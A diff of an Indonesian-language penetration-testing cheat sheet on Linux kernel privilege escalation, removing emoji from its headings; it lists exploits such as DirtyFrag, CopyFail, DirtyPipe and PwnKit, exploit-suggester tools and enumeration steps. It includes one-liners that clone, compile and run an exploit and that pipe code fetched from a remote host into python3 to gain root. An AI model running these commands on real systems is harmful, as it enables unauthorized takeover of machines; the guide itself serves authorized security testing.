@@ -1,16 +1,16 @@
-# 🚀 Kernel Local Privilege Escalation (Kernel LPE)
+﻿# Kernel Local Privilege Escalation (Kernel LPE)
 
 > **Tujuan:** Mengeksploitasi kerentanan pada kernel Linux untuk naik dari user terbatas menjadi **root**.
 
 ---
 
-## 📌 Penjelasan Singkat
+## Penjelasan Singkat
 
 Kernel LPE memanfaatkan celah pada **kernel space** (memori, modul, atau syscall) yang memungkinkan user biasa mengeksekusi code sebagai **root**. Eksploit kernel yang berhasil biasanya langsung menganugerahkan **uid=0** tanpa memerlukan password.
 
 ---
 
-## 🧪 Deteksi Versi Kernel
+## Deteksi Versi Kernel
 
 ```bash
 uname -r
@@ -24,9 +24,9 @@ cat /etc/os-release
 
 ---
 
-## 🧨 Exploit Populer
+## Exploit Populer
 
-### 1️⃣ DirtyFrag (CVE‑2026‑43284 / 43500)
+### 1 DirtyFrag (CVE‑2026‑43284 / 43500)
 
 ```bash
 git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && \
@@ -35,27 +35,27 @@ gcc -O0 -Wall -o exp exp.c -lutil && ./exp
 
 > Butuh modul `esp4`/`esp6`/`rxrpc`. Cek dengan `lsmod` atau `modinfo`.
 
-### 2️⃣ CopyFail (CVE‑2026‑31431)
+### 2 CopyFail (CVE‑2026‑31431)
 
 ```bash
 curl https://copy.fail/exp | python3 && su
 ```
 
-### 3️⃣ DirtyPipe (CVE‑2022‑0847)
+### 3 DirtyPipe (CVE‑2022‑0847)
 
 > Vulnerability pada Linux kernel yang memungkinkan **privilege escalation** pada kernel terdampak.
 
-### 4️⃣ DirtyCOW
+### 4 DirtyCOW
 
 > Kernel lama yang berkaitan dengan **race condition** pada mekanisme copy‑on‑write.
 
-### 5️⃣ PwnKit (CVE‑2021‑4034)
+### 5 PwnKit (CVE‑2021‑4034)
 
 > LPE pada `pkexec`/`polkit`.
 
 ---
 
-## 🤖 Linux Exploit Suggester (LES)
+## Linux Exploit Suggester (LES)
 
 Tool otomatis untuk mencocokkan kernel dengan CVE yang relevan.
 
@@ -86,7 +86,7 @@ Kernel version: 5.15.0-123-generic
 
 ---
 
-## 🪜 Langkah Umum (Cross‑Check)
+## Langkah Umum (Cross‑Check)
 
 ```text
 1. Deteksi kernel
@@ -106,7 +106,7 @@ Kernel version: 5.15.0-123-generic
 
 ---
 
-## 🔧 Quick Enumeration
+## Quick Enumeration
 
 ```bash
 uname -r
@@ -119,18 +119,18 @@ modinfo <MODULE>
 
 ---
 
-## ✅ Verifikasi Root
+## Verifikasi Root
 
 ```bash
 id
 # uid=0(root) euid=0(root) groups=0(root)
 ```
 
-> ⚠️ **Catatan:** Kernel LPE **hanya boleh diuji pada sistem yang Anda miliki atau yang secara eksplisit diizinkan untuk pengujian keamanan**.
+>  **Catatan:** Kernel LPE **hanya boleh diuji pada sistem yang Anda miliki atau yang secara eksplisit diizinkan untuk pengujian keamanan**.
 
 ---
 
-## 📋 Checklist Kernel LPE
+## Checklist Kernel LPE
 
 - [ ] Dapatkan versi kernel (`uname -r`).
 - [ ] Jalankan Linux Exploit Suggester (LES).
@@ -142,7 +142,7 @@ id
 
 ---
 
-## 📚 Referensi
+## Referensi
 
 - [Kernel Exploit Suggester – The‑Z‑Labs](https://github.com/The-Z-Labs/linux-exploit-suggester)
 - [Kernel Exploit Suggester 2 – jondonas](https://github.com/jondonas/linux-exploit-suggester-2)
